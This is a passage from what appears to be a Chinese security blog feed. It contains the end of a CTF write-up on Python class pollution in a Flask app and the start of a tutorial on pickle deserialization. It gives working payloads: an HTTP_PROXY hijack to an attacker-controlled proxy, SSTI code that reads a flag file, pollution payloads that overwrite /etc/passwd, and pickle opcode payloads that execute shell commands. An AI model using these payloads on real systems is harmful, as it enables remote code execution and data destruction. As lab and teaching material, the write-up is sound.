class="keyword">def</span> <span class="title function_">update</span>(<span class="params">src, dst</span>):   <span class="comment"># merge ԭ������Ⱦ</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">        <span class="keyword">for</span> key <span class="keyword">in</span> src:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(src[key], <span class="built_in">dict</span>):</span><br><span class="line">                 <span class="keyword">if</span> key <span class="keyword">in</span> dst <span class="keyword">and</span> <span class="built_in">isinstance</span>(src[key], <span class="built_in">dict</span>):</span><br><span class="line">                    update(src[key], dst[key])</span><br><span class="line">                 <span class="keyword">else</span>:</span><br><span class="line">                     dst[key] = src[key]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[key] = src[key]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> key, value <span class="keyword">in</span> src.items() :</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst,key) <span class="keyword">and</span> <span class="built_in">isinstance</span>(value, <span class="built_in">dict</span>):</span><br><span class="line">                update(value,<span class="built_in">getattr</span>(dst, key))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">setattr</span>(dst, key, value)</span><br></pre></td></tr></table></figure><p>这里将new_password直接合并到User</p><p>我们跟进User看看的原型类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MemUser</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">setUser</span>(<span class="params">self, username, password</span>):</span><br><span class="line">        self.username = username</span><br><span class="line">        self.password = password</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">setToken</span>(<span class="params">self, token</span>):</span><br><span class="line">        self.token = token</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.username=<span class="string">&quot;admin&quot;</span></span><br><span class="line">        self.password=<span class="string">&quot;password&quot;</span></span><br><span class="line">        self.token=jwt.encode(&#123;<span class="string">&#x27;username&#x27;</span>: self.username, <span class="string">&#x27;password&#x27;</span>: self.password&#125;, app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>], algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br></pre></td></tr></table></figure><p>这里重载了_<em>init</em>_, 那么就可以通过init来污染了</p><p>但是flag在哪并不知道</p><p>这里发现加载了os模块, 那么就可以控制环境变量, 或许flag就在环境变量中</p><p>这里简单尝试一下污染respone0</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240302101737306.png" alt="image-20240302101737306"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240302101751821.png" alt="image-20240302101751821"></p><p>可以看见已经污染成功了</p><p>但是这里并没有什么用</p><p>仔细观察源码发现search的地方用了一次渲染</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">render_template_string(data.text)</span><br></pre></td></tr></table></figure><p>而这个data来源于api.py读取的文件内容</p><p>稍微观察api.py 可以预测到当前还存在一个user的json文件</p><p>这样就又可以想到:</p><p>利用污染向user文件中插入一个模板字符串, 再把它读取出来渲染造成ssti</p><p>由于没有导入user,这里并不能修改user的内容</p><p>在harder学长的提示下 开始尝试污染http_proxy变量</p><h2 id="法一-污染HTTP-PROXY"><a href="#法一-污染HTTP-PROXY" class="headerlink" title="法一(污染HTTP_PROXY)"></a>法一(污染HTTP_PROXY)</h2><p>首先我们在vps上运行一个代理(当然这里是本地测试, 也可以不要vps), 将接收到的请求直接返回一个模板字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, defaults=&#123;<span class="string">&#x27;path&#x27;</span>: <span class="string">&#x27;&#x27;</span>&#125;, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&lt;path:path&gt;&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proxy</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#123;&#123;7*7&#125;&#125;&#x27;</span>, <span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;192.168.1.11&#x27;</span>, debug=<span class="literal">True</span>, port=<span class="number">8899</span>)</span><br></pre></td></tr></table></figure><p>之后对HTTP_PROXY环境变量进行污染, 使得所有的http请求全部代理到我们的服务器上</p><p>payload:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;os&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;environ&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;HTTP_PROXY&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://192.168.1.11:8899/&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>开启vps进行监听</p><p>在此调用search的api</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240302144331876.png" alt="image-20240302144331876"></p><p>可以看见这里返回49, 正是我们模板字符串被渲染后的值</p><p>之后就是ssti的利用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, defaults=&#123;<span class="string">&#x27;path&#x27;</span>: <span class="string">&#x27;&#x27;</span>&#125;, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&lt;path:path&gt;&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proxy</span>(<span class="params">path</span>):</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&quot;&#123;% for c in &#x27;&#x27;.__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27;%&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(\&quot;os\&quot;).popen(\&quot;cat /app/jW2SzsJM39euQ1sPj5JWpNRGcS1Etzbq_FLAG\&quot;).read()&#x27;)&#125;&#125;&#123;% endif %&#125;&#123;%endfor%&#125;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> payload, <span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;192.168.1.11&#x27;</span>, debug=<span class="literal">True</span>, port=<span class="number">8899</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240302154000485.png" alt="image-20240302154000485"></p><h2 id="法二-Flask变量污染"><a href="#法二-Flask变量污染" class="headerlink" title="法二(Flask变量污染)"></a>法二(Flask变量污染)</h2><p>参考:</p><p><a href="https://tttang.com/archive/1876/">https://tttang.com/archive/1876/</a></p><h3 id="spec-获取sys"><a href="#spec-获取sys" class="headerlink" title="__spec__获取sys"></a><code>__spec__</code>获取sys</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;os&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;__spec__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;sys&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;modules&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                <span class="attr">&quot;jinja2&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                    <span class="attr">&quot;runtime&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                        <span class="attr">&quot;exported&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                                            <span class="string">&quot;*;__import__(&#x27;os&#x27;).system(&#x27;echo 222 &gt; /etc/passwd&#x27;);#&quot;</span></span><br><span class="line">                                        <span class="punctuation">]</span></span><br><span class="line">                                    <span class="punctuation">&#125;</span></span><br><span class="line">                                <span class="punctuation">&#125;</span></span><br><span class="line">                            <span class="punctuation">&#125;</span></span><br><span class="line">                        <span class="punctuation">&#125;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="loader-获取sys"><a href="#loader-获取sys" class="headerlink" title="__loader__获取sys"></a><code>__loader__</code>获取sys</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;__loader__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;sys&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;modules&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                <span class="attr">&quot;jinja2&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                    <span class="attr">&quot;runtime&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                        <span class="attr">&quot;exported&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                                            <span class="string">&quot;*;__import__(&#x27;os&#x27;).system(&#x27;echo 111 &gt; /etc/passwd&#x27;);#&quot;</span></span><br><span class="line">                                        <span class="punctuation">]</span></span><br><span class="line">                                    <span class="punctuation">&#125;</span></span><br><span class="line">                                <span class="punctuation">&#125;</span></span><br><span class="line">                            <span class="punctuation">&#125;</span></span><br><span class="line">                        <span class="punctuation">&#125;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="法三-污染requests模块的respone"><a href="#法三-污染requests模块的respone" class="headerlink" title="法三(污染requests模块的respone)"></a>法三(污染requests模块的respone)</h2><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;requests&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;Response&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;text&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&#123;% for c in &#x27;&#x27;.__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27;%&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(\&quot;os\&quot;).popen(\&quot;cat /app/jW2SzsJM39euQ1sPj5JWpNRGcS1Etzbq_FLAG\&quot;).read()&#x27;)&#125;&#125;&#123;% endif %&#125;&#123;%endfor%&#125;&quot;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Swagger-docs&quot;&gt;&lt;a href=&quot;#Swagger-docs&quot; class=&quot;headerlink&quot; title=&quot;Swagger docs&quot;&gt;&lt;/a&gt;Swagger docs&lt;/h1&gt;&lt;p&gt;一进去是一个文档内容, 还以为是容器没弄好&lt;/p&gt;
&lt;p&gt;仔</summary>
      
    
    
    
    
    <category term="Flask审计" scheme="http://example.com/tags/Flask%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="ssti" scheme="http://example.com/tags/ssti/"/>
    
    <category term="Python原型链污染(类污染)" scheme="http://example.com/tags/Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93-%E7%B1%BB%E6%B1%A1%E6%9F%93/"/>
    
  </entry>
  
  <entry>
    <title>pickle反序列化</title>
    <link href="http://example.com/2024/02/28/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://example.com/2024/02/28/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2024-02-28T08:10:51.000Z</published>
    <updated>2024-02-29T08:16:43.516Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pickle反序列化"><a href="#pickle反序列化" class="headerlink" title="pickle反序列化"></a>pickle反序列化</h1><p>在pyhton中也存在序列化和反序列化的操作, 由pickle模块实现</p><p>与php中的<code>serialize()</code>和<code>unserialize()</code>相对应,在python中为<code>pickle.dump()</code>和<code>pickle.load()</code></p><p>示例:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;hello, world!&#x27;</span></span><br><span class="line">filename = <span class="string">&#x27;nacl&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    pickle.dump(data, f) <span class="comment"># 序列化</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="built_in">print</span>(f.read())</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="built_in">print</span>(pickle.load(f)) <span class="comment"># 反序列化</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">#输出</span></span><br><span class="line"><span class="comment"># b&#x27;\x80\x04\x95\x11\x00\x00\x00\x00\x00\x00\x00\x8c\rhello, world!\x94.&#x27;</span></span><br><span class="line"><span class="comment"># hello, world!</span></span><br></pre></td></tr></table></figure><blockquote><p>pickle.load()用于从文件中加载序列化的对象</p><p>pickle.load()从字节流中加载序列化的对象</p><p>pickle.dump()将序列化的二进制数据保存到文件</p><p>pickle.dumps()直接返回序列化后的二进制流</p></blockquote><h2 id="reduce-方法"><a href="#reduce-方法" class="headerlink" title="__reduce__方法"></a><code>__reduce__</code>方法</h2><blockquote><p><code>__reduce__</code><br>调用:被定义之后，当对象被pickle时就会触发<br>作用:如果接收到的是字符串，就会把这个字符串当成一个全局变量的名称，然后Python查找它并进去pickle<br>    如果接收到的是元组，这个元组应该包含2-6个元素，其中包括：一个可调用对象，用于创建对象，参数元素，供对象调用</p></blockquote><p>例:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">a</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (os.system,(<span class="string">&#x27;whoami&#x27;</span>,))</span><br><span class="line">s = a() </span><br><span class="line">payload = pickle.dumps(s)</span><br><span class="line">pickle.loads(payload)</span><br></pre></td></tr></table></figure><p><strong>注: pickle反序列化后执行函数时会自动尝试导入未导入的模块, 所以即便网站应用并没有import os 也可以执行成功</strong></p><p>此时whoami会被执行,达到目的,</p><p>当然也可以通过os.system来执行命令反弹shell</p><h2 id="opcode"><a href="#opcode" class="headerlink" title="opcode"></a>opcode</h2><p>opcode就是序列化后的结果, 实际上它是将对象等实例化为某种指令集的结果, 依靠PVM来解析</p><p>v0 版协议是原始的“人类可读”协议，并且向后兼容早期版本的 Python</p><p>由于其向前兼容的特性, 我们可以手动编写opcode指令, 反序列化即可执行恶意脚本</p><h2 id="PVM"><a href="#PVM" class="headerlink" title="PVM"></a>PVM</h2><p>PVM由以下三部分组成</p><ul><li>指令处理器：从流中读取 <code>opcode</code> 和参数，并对其进行解释处理。重复这个动作，直到遇到 . 这个结束符后停止。 最终留在栈顶的值将被作为反序列化对象返回。</li><li>stack：由 Python 的 <strong><code>list</code></strong> 实现，被用来临时存储数据、参数以及对象。</li><li>memo：由 Python 的 <strong><code>dict</code></strong> 实现，为 PVM 的整个生命周期提供存储。</li></ul><h2 id="常用的opcode"><a href="#常用的opcode" class="headerlink" title="常用的opcode"></a>常用的opcode</h2><table><thead><tr><th align="left">指令</th><th align="left">描述</th><th align="left">具体写法</th><th align="left">栈上的变化</th></tr></thead><tbody><tr><td align="left">c</td><td align="left">获取一个全局对象或import一个模块</td><td align="left">c[module]\n[instance]\n</td><td align="left">获得的对象入栈</td></tr><tr><td align="left">o</td><td align="left">寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</td><td align="left">o</td><td align="left">这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈</td></tr><tr><td align="left">i</td><td align="left">相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</td><td align="left">i[module]\n[callable]\n</td><td align="left">这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈</td></tr><tr><td align="left">N</td><td align="left">实例化一个None</td><td align="left">N</td><td align="left">获得的对象入栈</td></tr><tr><td align="left">S</td><td align="left">实例化一个字符串对象</td><td align="left">S’xxx’\n（也可以使用双引号、&#39;等python字符串形式）</td><td align="left">获得的对象入栈</td></tr><tr><td align="left">V</td><td align="left">实例化一个UNICODE字符串对象</td><td align="left">Vxxx\n</td><td align="left">获得的对象入栈</td></tr><tr><td align="left">I</td><td align="left">实例化一个int对象</td><td align="left">Ixxx\n</td><td align="left">获得的对象入栈</td></tr><tr><td align="left">F</td><td align="left">实例化一个float对象</td><td align="left">Fx.x\n</td><td align="left">获得的对象入栈</td></tr><tr><td align="left">R</td><td align="left">选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</td><td align="left">R</td><td align="left">函数和参数出栈，函数的返回值入栈</td></tr><tr><td align="left">.</td><td align="left">程序结束，栈顶的一个元素作为pickle.loads()的返回值</td><td align="left">.</td><td align="left">无</td></tr><tr><td align="left">(</td><td align="left">向栈中压入一个MARK标记</td><td align="left">(</td><td align="left">MARK标记入栈</td></tr><tr><td align="left">t</td><td align="left">寻找栈中的上一个MARK，并组合之间的数据为元组</td><td align="left">t</td><td align="left">MARK标记以及被组合的数据出栈，获得的对象入栈</td></tr><tr><td align="left">)</td><td align="left">向栈中直接压入一个空元组</td><td align="left">)</td><td align="left">空元组入栈</td></tr><tr><td align="left">l</td><td align="left">寻找栈中的上一个MARK，并组合之间的数据为列表</td><td align="left">l</td><td align="left">MARK标记以及被组合的数据出栈，获得的对象入栈</td></tr><tr><td align="left">]</td><td align="left">向栈中直接压入一个空列表</td><td align="left">]</td><td align="left">空列表入栈</td></tr><tr><td align="left">d</td><td align="left">寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对）</td><td align="left">d</td><td align="left">MARK标记以及被组合的数据出栈，获得的对象入栈</td></tr><tr><td align="left">}</td><td align="left">向栈中直接压入一个空字典</td><td align="left">}</td><td align="left">空字典入栈</td></tr><tr><td align="left">p</td><td align="left">将栈顶对象储存至memo_n</td><td align="left">pn\n</td><td align="left">无</td></tr><tr><td align="left">g</td><td align="left">将memo_n的对象压栈</td><td align="left">gn\n</td><td align="left">对象被压栈</td></tr><tr><td align="left">0</td><td align="left">丢弃栈顶对象</td><td align="left">0</td><td align="left">栈顶对象被丢弃</td></tr><tr><td align="left">b</td><td align="left">使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置</td><td align="left">b</td><td align="left">栈上第一个元素出栈</td></tr><tr><td align="left">s</td><td align="left">将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中</td><td align="left">s</td><td align="left">第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新</td></tr><tr><td align="left">u</td><td align="left">寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中</td><td align="left">u</td><td align="left">MARK标记以及被组合的数据出栈，字典被更新</td></tr><tr><td align="left">a</td><td align="left">将栈的第一个元素append到第二个元素(列表)中</td><td align="left">a</td><td align="left">栈顶元素出栈，第二个元素（列表）被更新</td></tr><tr><td align="left">e</td><td align="left">寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中</td><td align="left">e</td><td align="left">MARK标记以及被组合的数据出栈，列表被更新</td></tr></tbody></table><h2 id="函数执行opcode构造"><a href="#函数执行opcode构造" class="headerlink" title="函数执行opcode构造"></a>函数执行opcode构造</h2><p><code>R</code> :</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;&#x27;&#x27;cos      # 使用c来import os模块</span><br><span class="line">system</span><br><span class="line">(S&#x27;whoami&#x27;   # (压入mark标记   S实例化一个字符串对象</span><br><span class="line">tR.&#x27;&#x27;&#x27; # 寻找上一个mark标记并将之间的数据合并为一个元组 即(&#x27;whoami&#x27;,)</span><br><span class="line"> # R选择第一个对象为函数,第二个对象为参数 即os.system(&#x27;whoami&#x27;,)</span><br></pre></td></tr></table></figure><p><code>o</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;&#x27;&#x27;(cos  # 使用c来import os模块</span><br><span class="line">system</span><br><span class="line">S&#x27;whoami&#x27; # S实例化一个字符串对象</span><br><span class="line">o.&#x27;&#x27;&#x27;  # o寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）即 os.system(&#x27;whoami&#x27;)</span><br></pre></td></tr></table></figure><p><code>i</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;&#x27;&#x27;(S&#x27;whoami&#x27;  # (压入mark标记   S实例化一个字符串对象</span><br><span class="line">ios# i相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</span><br><span class="line">system</span><br><span class="line">.&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><p>下面搬运两张PVM解析opcode的动图演示</p><ul><li>PVM解析 <code>str</code> 的过程</li></ul><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/20200320230631-6204866e-6abc-1.gif"></p><ul><li>PVM解析 <code>__reduce__()</code> 的过程</li></ul><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/20200320230711-7972c0ea-6abc-1.gif"></p><h2 id="Pker工具"><a href="#Pker工具" class="headerlink" title="Pker工具"></a>Pker工具</h2><p><a 